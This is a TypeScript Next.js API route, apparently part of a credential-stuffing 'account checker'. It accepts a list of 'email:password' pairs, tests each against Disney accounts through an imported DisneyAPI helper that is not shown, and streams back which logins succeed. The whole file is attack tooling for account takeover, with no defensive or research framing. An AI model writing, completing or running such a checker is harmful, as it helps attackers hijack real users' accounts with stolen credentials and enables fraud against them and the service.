import { NextResponse } from 'next/server';
import { DisneyAPI } from '../../../utils/disney/disneyApi';

export async function POST(request: Request) {
  const encoder = new TextEncoder();
  const accounts = await request.json();

  const stream = new TransformStream();
  const writer = stream.writable.getWriter();

  const sendResult = async (result: any) => {
    const data = encoder.encode(`data: ${JSON.stringify({ result })}\n\n`);
    await writer.write(data);
  };

  (async () => {
    try {
      for (const account of accounts) {
        const [email, password] = account.split(':');
        if (!email || !password) {
          await sendResult({
            account,
            success: false,
            error: 'Formato inválido'
          });
          continue;
        }

        try {
          const api = new DisneyAPI();
          const result = await api.checkAccount(email, password);
          await sendResult({
            account,
            ...result
          });
        } catch (error: any) {
          await sendResult({
            account,
            success: false,
            error: error.message || 'Error al verificar la cuenta'
          });
        }
      }
    } catch (error) {
      console.error('Error en el stream:', error);
    } finally {
      await writer.close();
    }
  })();

  return new Response(stream.readable, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    }
  });
} 